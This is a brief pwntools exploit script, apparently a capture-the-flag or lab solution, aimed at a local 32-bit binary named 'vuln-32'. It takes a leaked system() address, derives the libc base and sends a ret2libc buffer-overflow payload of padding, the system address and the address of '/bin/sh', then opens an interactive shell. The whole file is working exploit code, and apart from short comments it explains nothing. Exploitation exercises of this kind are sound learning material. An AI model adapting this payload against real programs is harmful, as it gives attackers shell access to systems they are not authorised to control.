from pwn import *

# Set arch context
elf = context.binary = ELF('./vuln-32')
io = process()


# Set elf object as libc so dont need to manually use ldd and strings
libc = elf.libc


# Grab leaked system address
io.recvuntil('at: ')
sys_leak = int(io.recvline(), 16)


# Calculate libc address
libc.address = sys_leak - libc.sym['system']


# Output the address
log.success(f'LIBC base: {hex(libc.address)}')



# Send payload use flat so dont need to manually put p32()
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

io.sendline(payload)
io.interactive()